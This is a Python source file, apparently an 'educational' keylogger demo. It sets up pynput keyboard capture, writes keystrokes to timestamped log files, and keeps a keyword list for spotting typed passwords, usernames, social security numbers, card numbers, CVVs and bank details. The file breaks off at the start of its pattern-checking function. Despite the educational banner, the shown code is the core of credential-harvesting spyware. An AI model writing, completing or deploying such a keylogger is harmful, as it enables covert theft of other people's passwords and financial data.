import pynput
from pynput.keyboard import Key, Listener
import logging
import datetime
import os
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored terminal output
init()

# Create logs directory if it doesn't exist
if not os.path.exists('logs'):
    os.makedirs('logs')

# Configure logging
log_file = f"logs/keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, 
                    format='%(asctime)s: %(message)s')

# Suspicious patterns to detect (for educational purposes)
suspicious_patterns = [
    'password', 'pass', 'pwd', 'username', 'login', 'ssn', 'social', 
    'credit', 'card', 'cvv', 'expiry', 'bank', 'account'
]

# Buffer to store recent keystrokes for pattern detection
key_buffer = []
MAX_BUFFER_SIZE = 20

print(f"{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Educational Keylogger Demo{Style.RESET_ALL}              {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.RED}FOR EDUCATIONAL PURPOSES ONLY{Style.RESET_ALL}         {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}╠══════════════════════════════════════════╣{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} Logging to: {Fore.GREEN}{log_file}{Style.RESET_ALL}   {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} Press {Fore.RED}Esc{Style.RESET_ALL} to exit                        {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

def check_for_suspicious_patterns(buffer):
    
